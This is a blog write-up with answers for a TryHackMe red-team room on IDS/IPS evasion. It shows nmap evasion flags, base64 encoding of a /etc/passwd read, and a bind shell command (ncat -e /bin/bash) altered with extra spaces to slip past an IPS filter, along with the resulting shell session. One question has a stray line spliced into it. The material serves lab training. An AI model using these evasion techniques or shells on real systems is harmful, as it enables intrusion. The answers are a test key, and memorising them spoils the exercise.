---
title: Network Security Solutions   
author: CYB3RM3
name: CYB3RM3 | Network Security Solutions  
date: 2022-03-03 09:48:01 +0100
categories: [TryHackMe, RedTeam]
tags: [Red Team]
---

Learn about and experiment with various IDS/IPS evasion techniques, such as protocol and payload manipulation.

THM Room [https://tryhackme.com/room/redteamnetsec](https://tryhackme.com/room/redteamnetsec)



## TASK 1 : Introduction


### What does an IPS stand for? 

Answer : Intrusion Prevention System

### What do you call a system that can detect malicious activity but not stop it?

Answer : Intrusion Detection System

## TASK 2 : IDS Engine Types


### What kind of IDS engine has a database of all known malicious packets’ contents?

Answer : Signature-based

### What kind of IDS engine needs to learn what normal traffic looks like instead of malicious traffic?

Answer : Anomaly-based

### What kind of IDS engine needs to be updated constantly as new malicious packets and activities are discovered?

Answer : Signature-based

## TASK 3 : IDS/IPS Rule Triggering
###  In the attached file, the logs show that a specific IP address has been detected scanning our system of IP address 10.10.112.168. What is the IP address running the port scan? 

The first log is ECHO REPLY from target to host who scan :

![Ping Scan](/images/thm/redteamnetsec/redteamnetsec_1.png)
_Ping Scan_

Answer : 10.14.17.226

## TASK 4 : Evasion via Protocol Manipulation

### What other two We use the following Nmap command, nmap -sU -F 10.10.160.99, to launch a UDP scan against our target. What is the option we need to add to set the source port to 161?does smss.exe start in Session 1? (answer format: process1, process2) 

Answer : -g 161

### The target allows Telnet traffic. Using ncat, how do we set a listener on the Telnet port?

Answer : ncat -lvnp 23

### We are scanning our target using nmap -sS -F 10.10.160.99. We want to fragment the IP packets used in our Nmap scan so that the data size does not exceed 16 bytes. What is the option that we need to add?

Answer : -ff

### Start the AttackBox and the attached machine. Consider the following three types of Nmap scans:
        -sX for Xmas Scan
        -sF for FIN Scan
        -sNfor Null Scan
    Which of the above three arguments would return meaningful results when scanning 10.10.160.99?

```console
root@ip-10-10-28-96:~# nmap -sX 10.10.160.99

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-02 15:26 GMT
Nmap scan report for ip-10-10-160-99.eu-west-1.compute.internal (10.10.160.99)
Host is up (0.0012s latency).
All 1000 scanned ports on ip-10-10-160-99.eu-west-1.compute.internal (10.10.160.99) are closed
MAC Address: 02:3A:45:00:D7:7B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
root@ip-10-10-28-96:~# nmap -sF 10.10.160.99

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-02 15:27 GMT
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing FIN Scan
FIN Scan Timing: About 44.77% done; ETC: 15:28 (0:00:41 remaining)
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing FIN Scan
FIN Scan Timing: About 45.85% done; ETC: 15:28 (0:00:40 remaining)
Nmap scan report for ip-10-10-160-99.eu-west-1.compute.internal (10.10.160.99)
Host is up (0.00053s latency).
Not shown: 998 closed ports
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
8080/tcp open|filtered http-proxy
MAC Address: 02:3A:45:00:D7:7B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 95.47 seconds
root@ip-10-10-28-96:~# nmap -sN 10.10.160.99

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-02 15:29 GMT
Nmap scan report for ip-10-10-160-99.eu-west-1.compute.internal (10.10.160.99)
Host is up (0.0012s latency).
All 1000 scanned ports on ip-10-10-160-99.eu-west-1.compute.internal (10.10.160.99) are closed
MAC Address: 02:3A:45:00:D7:7B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds
```
{: .nolineno }

Answer : -sF



### What is the option in hping3 to set a custom TCP window size?

As per hping manual <http://www.hping.org/manpage.html>:

![hping manual](/images/thm/redteamnetsec/redteamnetsec_2.png)
_hping manual_

Answer : -w

## TASK 5 : Evasion via Payload Manipulation

### Using base64 encoding, what is the transformation of cat /etc/passwd?

From comand line :
```console
root@ip-10-10-28-96:~# echo "cat /etc/passwd" > test.txt
root@ip-10-10-28-96:~# base64 test.txt 
Y2F0IC9ldGMvcGFzc3dkCg==
```
{: .nolineno }

Answer : Y2F0IC9ldGMvcGFzc3dkCg==

### The base32 encoding of a particular string is NZRWC5BAFVWCAOBQHAYAU===. What is the original string?

Using Cyberchef or base64 -d in comman line :

![CyberChef](/images/thm/redteamnetsec/redteamnetsec_3.png)
_CyberChef_

Answer : ncat -l 8080

### Using the provided openssl command above. You created a certificate, which we gave the extension .crt, and a private key, which we gave the extension .key. What is the first line in the certificate file?

![certificate file](/images/thm/redteamnetsec/redteamnetsec_4.png)
_certificate file_

Answer : -----BEGIN CERTIFICATE-----

### What is the last line in the private key file?

![certificate end file](/images/thm/redteamnetsec/redteamnetsec_5.png)
_certificate end file_

Answer : -----END PRIVATE KEY-----

### On the attached machine from the previous task, browse to http://10.10.160.99:8080, where you can write your Linux commands. Note that no output will be returned. A command like ncat -lvnp 1234 -e /bin/bash will create a bind shell that you can connect to it from the AttackBox using ncat 10.10.160.99 1234; however, some IPS is filtering out the command we are submitting on the form. Using one of the techniques mentioned in this task, try to adapt the command typed in the form to run properly. Once you connect to the bind shell using ncat 10.10.160.99 1234, find the user’s name.

Using an extra space in the ncat command on the webserver :

```console
ncat  -lvnp 1234  -e  /bin/bash 
```
{: .nolineno }

![ncat command](/images/thm/redteamnetsec/redteamnetsec_6.png)
_ncat command_

Using ncat to connect on the bind shell from Kali :

```console
root@ip-10-10-28-96:~# ncat 10.10.160.99 1234
id
uid=1001(redteamnetsec) gid=1001(redteamnetsec) groups=1001(redteamnetsec)
whoami
redteamnetsec
```
{: .nolineno }

Answer : redteamnetsec

## TASK 6 : Evasion via Route Manipulation
### Protocols used in proxy servers can be HTTP, HTTPS, SOCKS4, and SOCKS5. Which protocols are currently supported by Nmap?

Answer : HTTP SOCKS4

## TASK 7 : Evasion via Tactical DoS
### Make sure you have read and understood the three points of this task. 

No Answer.

## TASK 8 : C2 and IDS/IPS Evasion
### Which variable would you modify to add a random sleep time between beacon check-ins?

Answer : Jitter

## TASK 9 : Next-Gen Security
### Read about NGFW in the Red Team Firewalls room.

No Answer.

Red Team Firewall room is already available in CTF&WRITESUP.

## TASK 10 : Summary 

### Continue your learning with the next room. 

No Answer.
